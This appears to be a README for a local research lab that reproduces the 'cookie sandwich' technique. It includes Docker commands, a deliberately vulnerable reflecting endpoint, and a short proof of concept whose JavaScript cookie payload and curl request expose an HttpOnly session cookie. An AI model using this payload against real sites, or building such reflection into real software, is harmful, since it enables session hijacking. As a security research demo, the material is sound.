# Cookie Sandwich Demo (Tomcat legacy + reflection)

Based on PortSwigger research: https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique

## Build & Run (Docker)
```bash
docker build -t cookie-sandwich /Users/kesselbach/security-research/cookie-sandwich
docker run --rm -p 8091:8091 --name cookie-sandwich cookie-sandwich
```

## Endpoints
- /set-session — sets HttpOnly PHPSESSID=secret-session
- /json?session=ignored — reflects the 'session' cookie value into JSON (CORS allowed with credentials)

## PoC
1) Set HttpOnly cookie:
```bash
curl -i http://localhost:8091/set-session
```

2) Craft sandwich (browser JS outline; use an XSS or console):
```javascript
document.cookie = `$Version=1; path=/json;`;
document.cookie = `session="start; PHPSESSID=secret-session; dummy=end"; path=/json;`;
```

3) Fetch the reflected value (same-origin or CORS with credentials):
```bash
curl -s -H 'Cookie: $Version=1; session="start; PHPSESSID=secret-session; dummy=end"' \
     http://localhost:8091/json
```

Expected: JSON includes the concatenated value containing the HttpOnly cookie.

Note: This is intentionally insecure for research only. Do not deploy to production.
